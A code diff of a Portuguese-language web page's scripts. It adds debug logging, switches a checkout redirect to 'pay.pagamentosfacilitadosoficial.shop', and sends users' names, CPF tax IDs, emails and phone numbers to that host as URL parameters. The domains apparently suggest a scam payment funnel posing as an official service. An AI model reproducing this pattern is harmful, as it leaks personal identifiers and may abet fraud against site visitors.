@@ -188,6 +188,15 @@
         </div>
 
         <script>
+            // Debug: Log dos parâmetros recebidos na página up1
+            console.log('=== DEBUG UP1 PAGE ===');
+            console.log('URL atual:', window.location.href);
+            console.log('Parâmetros recebidos:', window.location.search);
+            if (window.location.search) {
+                console.log('Parâmetros parseados:', new URLSearchParams(window.location.search));
+            }
+        </script>
+        <script>
             function getUrlParams() {
                 const params = {};
                 const queryString = window.location.search;
@@ -219,17 +228,21 @@
                     const email = localStorage.getItem('email') || '';
                     const telephone = localStorage.getItem('telephone') || '';
                     
-                    const baseUrl = 'https://pay.novopagamentooseguro.com/checkout/5cbcee70-3fbe-42be-bd34-5efaf0760b41';
+                    const baseUrl = 'https://pay.pagamentosfacilitadosoficial.shop/a9ArZMl8oWx37xj';
                     const url = new URL(baseUrl);
                     
                     // Adicionar parâmetros do usuário
                     url.searchParams.append('name', dadosUsuario.NOME || '');
                     url.searchParams.append('document', dadosUsuario.CPF || '');
-                    url.searchParams.append('email', email);
-                    url.searchParams.append('telephone', telephone);
+                    url.searchParams.append('email', email || 'useraleatorio@gmail.com');
+                    url.searchParams.append('telephone', telephone || '');
                     
                     // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
                     const finalUrl = buildUrlWithParams(url.toString());
+                    
+                    console.log('=== DEBUG UP1 PAYMENT ===');
+                    console.log('URL final para checkout:', finalUrl);
+                    console.log('Parâmetros capturados:', getUrlParams());
                     
                     const button = document.querySelector('button');
                     button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Processando pagamento';
@@ -237,7 +250,7 @@
                     window.location.href = finalUrl;
                 } catch(err) {
                     console.error('Erro ao redirecionar:', err);
-                    window.location.href = buildUrlWithParams('https://pay.novopagamentooseguro.com/checkout/5cbcee70-3fbe-42be-bd34-5efaf0760b41');
+                    window.location.href = buildUrlWithParams('https://pay.pagamentosfacilitadosoficial.shop/a9ArZMl8oWx37xj');
                 }
             }
         </script>
